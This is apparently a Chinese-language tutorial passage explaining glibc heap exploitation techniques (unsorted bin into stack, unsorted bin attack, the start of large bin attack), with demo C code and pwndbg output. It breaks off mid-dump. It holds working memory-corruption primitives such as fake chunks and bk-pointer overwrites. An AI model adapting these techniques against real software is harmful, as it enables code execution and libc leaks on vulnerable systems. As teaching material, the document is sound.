<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p victim </span><br><span class="line">$1 &#x3D; (intptr_t *) 0x602010</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>接下来在栈上 fake 一块 chunk。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br></pre></td></tr></table></figure>
<p>伪造的 bk 指向自身。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x &amp;stack_buffer </span><br><span class="line">$3 &#x3D; 0x7fffffffdc50</span><br><span class="line">pwndbg&gt; p&#x2F;x stack_buffer </span><br><span class="line">$4 &#x3D; &#123;0x0, 0x110, 0x0, 0x7fffffffdc50&#125;</span><br></pre></td></tr></table></figure>
<p>假设此时有一个堆溢出漏洞，可以修改 victim 的内容：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>但是在修改之前，我们要过一个 check：我们要修改的 size 要满足条件：size &gt; 16 (x64)，size &lt; <code>av-&gt;system_mem</code>。</p>
<p>因此我们修改 size 为 32，victim 的 bk 指向 stack_buffer。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p victim </span><br><span class="line">$5 &#x3D; (intptr_t *) 0x602010</span><br><span class="line">pwndbg&gt; x&#x2F;10xg victim - 2</span><br><span class="line">0x602000:	0x0000000000000000	0x0000000000000020</span><br><span class="line">0x602010:	0x00007ffff7dd1b78	0x00007fffffffdc50      &lt;-- fd, fake bk</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;10xg 0x00007fffffffdc50</span><br><span class="line">0x7fffffffdc50:	0x0000000000000000	0x0000000000000110      &lt;-- fake chunk</span><br><span class="line">0x7fffffffdc60:	0x0000000000000000	0x00007fffffffdc50</span><br><span class="line">0x7fffffffdc70:	0x00007fffffffdd60	0xb6520ac971917b00</span><br><span class="line">0x7fffffffdc80:	0x0000000000400870	0x00007ffff7a2d830</span><br><span class="line">0x7fffffffdc90:	0x0000000000000001	0x00007fffffffdd68</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000</span><br><span class="line">BK: 0x602000 —▸ 0x7fffffffdc50 ◂— 0x7fffffffdc50</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>此时我们可以看到 fake chunk 已经被链接在 unsorted bin 中。下一次 malloc 时，malloc 会顺着 bk 指针进行遍历，这样就可以找到大小正好合适的 fake chunk 了：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x100): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x100</span>));</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000</span><br><span class="line">BK: 0x7fffffffdc50 ◂— 0x7fffffffdc50</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>fake chunk 被取出，victim chunk 被从 unsorted bin 中取出放入了 small bin 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x stack_buffer </span><br><span class="line">$6 &#x3D; &#123;0x0, 0x110, 0x7ffff7dd1b78, 0x7fffffffdc50&#125;</span><br></pre></td></tr></table></figure>
<p>此时 fake chunk 的 fd 也被修改了，这里是 unsorted bin 的地址，通过它可以泄露 libc 的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg stack_buffer </span><br><span class="line">0x7fffffffdc50:	0x0000000000000000	0x0000000000000110      &lt;-- fake chunk</span><br><span class="line">0x7fffffffdc60:	0x00007ffff7dd1b78	0x00007fffffffdc50      &lt;-- new fd, bk</span><br><span class="line">0x7fffffffdc70:	0x00007fffffffdd60	0xb6520ac971917b00</span><br><span class="line">0x7fffffffdc80:	0x0000000000400870	0x00007ffff7a2d830</span><br><span class="line">0x7fffffffdc90:	0x0000000000000001	0x00007fffffffdd68</span><br><span class="line">0x7fffffffdca0:	0x00000001f7ffcca0	0x00000000004006a6</span><br><span class="line">0x7fffffffdcb0:	0x0000000000000000	0x2ba995469c7be0c4</span><br><span class="line">0x7fffffffdcc0:	0x00000000004005b0	0x00007fffffffdd60</span><br><span class="line">0x7fffffffdcd0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffdce0:	0xd4566a3935bbe0c4	0xd4567a83234be0c4</span><br></pre></td></tr></table></figure>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;unsorted_bin_into_stack</span><br><span class="line">Allocating the victim chunk</span><br><span class="line">Allocating another chunk to avoid consolidating the top chunk with the small one during the free()</span><br><span class="line">Freeing the chunk 0x602010, it will be inserted in the unsorted bin</span><br><span class="line">Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer</span><br><span class="line">Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem</span><br><span class="line">Now next malloc will return the region of our fake chunk: 0x7fffffffdc50</span><br><span class="line">malloc(0x100): 0x7fffffffdc50</span><br></pre></td></tr></table></figure>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p>Exploiting the overwrite of a freed chunk on unsorted bin freelist to write a large value into arbitrary address</p>
<blockquote>
<p>unsorted bin 攻击通常是为更进一步的攻击做准备的，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。</p>
</blockquote>
<h3 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h3><p>unlink 的对 unsorted bin 的操作是这样的：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">    unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>我们先申请两块 chunk，释放第一个使其加入 unsorted bin：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">          <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">	   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>接下来，我们假设有堆溢出漏洞：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>这样的话把 p-&gt;bk 指向了 stack 上的 fake chunk - 2 的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p p</span><br><span class="line">$1 &#x3D; (unsigned long *) 0x602010</span><br><span class="line">pwndbg&gt; x&#x2F;20gx p-2</span><br><span class="line">0x602000:	0x0000000000000000	0x00000000000001a1</span><br><span class="line">0x602010:	0x00007ffff7dd1b78	0x00007fffffffdc68</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;20gx p[1]</span><br><span class="line">0x7fffffffdc68:	0x000000000040081e	0x0000000000400890</span><br><span class="line">0x7fffffffdc78:	0x0000000000000000	0x0000000000602010</span><br><span class="line">0x7fffffffdc88:	0x6ed73e366a987500	0x0000000000400890</span><br><span class="line">0x7fffffffdc98:	0x00007ffff7a2d830	0x0000000000000001</span><br><span class="line">0x7fffffffdca8:	0x00007fffffffdd78	0x00000001f7ffcca0</span><br><span class="line">0x7fffffffdcb8:	0x00000000004006a6	0x0000000000000000</span><br><span class="line">0x7fffffffdcc8:	0x5fdbc05b7ab47468	0x00000000004005b0</span><br><span class="line">0x7fffffffdcd8:	0x00007fffffffdd70	0x0000000000000000</span><br><span class="line">0x7fffffffdce8:	0x0000000000000000	0xa0243f24d2d47468</span><br><span class="line">0x7fffffffdcf8:	0xa0242f9ec4447468	0x0000000000000000</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 417, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk &#x3D; 0x7fffffffdc68, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们 malloc 一块新 chunk：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">	   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br></pre></td></tr></table></figure>
<p>这个时候，malloc 循着 bk 去申请一块新 chunk：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20gx &amp;stack_var - 2</span><br><span class="line">0x7fffffffdc68:	0x0000000000400828	0x0000000000400890      &lt;-- fake chunk</span><br><span class="line">0x7fffffffdc78:	0x00007ffff7dd1b78	0x0000000000602010      &lt;-- fd</span><br><span class="line">0x7fffffffdc88:	0x6ed73e366a987500	0x0000000000400890</span><br><span class="line">0x7fffffffdc98:	0x00007ffff7a2d830	0x0000000000000001</span><br><span class="line">0x7fffffffdca8:	0x00007fffffffdd78	0x00000001f7ffcca0</span><br><span class="line">0x7fffffffdcb8:	0x00000000004006a6	0x0000000000000000</span><br><span class="line">0x7fffffffdcc8:	0x5fdbc05b7ab47468	0x00000000004005b0</span><br><span class="line">0x7fffffffdcd8:	0x00007fffffffdd70	0x0000000000000000</span><br><span class="line">0x7fffffffdce8:	0x0000000000000000	0xa0243f24d2d47468</span><br><span class="line">0x7fffffffdcf8:	0xa0242f9ec4447468	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0 </span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000</span><br><span class="line">BK: 0x7fffffffdc68 —▸ 0x602010 ◂— 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>此时 fake chunk 的 fd 指向了 unsorted bin 的 head 地址了。</p>
<blockquote>
<p>这也算是 unlink 的另一种用法，上一篇的总结中，unsafe_unlink 通过 unlink 来直接控制地址，这里则是通过 unlink 来泄漏 libc 的信息，来进行进一步的攻击。流程也较为简单。<br>和 house_of_lore 操作有点像，也是通过修改 victim 的 bk 字段，不过我们做这个的主要目的不是返回一个可控的地址，而是将libc的信息写到了我们可控的区域。</p>
</blockquote>
<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;unsorted_bin_attack</span><br><span class="line">This file demonstrates unsorted bin attack by write a large unsigned long value into stack</span><br><span class="line">In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack</span><br><span class="line"></span><br><span class="line">Let&#39;s first look at the target we want to rewrite on stack:</span><br><span class="line">0x7fffffffdcc8: 0</span><br><span class="line"></span><br><span class="line">Now, we allocate first normal chunk on the heap at: 0x602010</span><br><span class="line">And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()</span><br><span class="line"></span><br><span class="line">We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7ffff7dd1b78</span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fffffffdcb8</span><br><span class="line"></span><br><span class="line">Let&#39;s malloc again to get the chunk we just free. During this time, the target should have already been rewritten:</span><br><span class="line">0x7fffffffdcc8: 0x7ffff7dd1b78</span><br></pre></td></tr></table></figure>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p>Exploiting the overwrite of a freed chunk on large bin freelist to write a large value into arbitrary address</p>
<h3 id="解释-3"><a href="#解释-3" class="headerlink" title="解释"></a>解释</h3><p>这个文件通过向栈上写数据以展示 large bin attack。</p>
<p>实际上，large bin attack 通常被作为其他攻击的基础，例如重写 libc 中的全局变量。</p>
<p>首先 malloc 第一个 large chunk：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>接下来为了避免合并下一个 large chunk 时与第一块 large chunk 合并，我们申请一块 fastbin chunk。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">       <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>
<p>再申请第二块 large chunk：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>为了避免下一块 large chunk free 的时候与 第二块合并，再申请一块 fastbin。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">       <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>
<p>最后申请第三块 large chunk，和上面类似，为了防止 free 的时候与 top chunk 合并，我们还要申请一块 fastbin。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">       <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>
<p>接下来释放第一块 large chunk 和第二块 large chunk。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">       <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure>
<p>它们会被加入 unsorted bin 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603360 —▸ 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603360 &#x2F;* &#39;&#96;3&#96;&#39; *&#x2F;</span><br><span 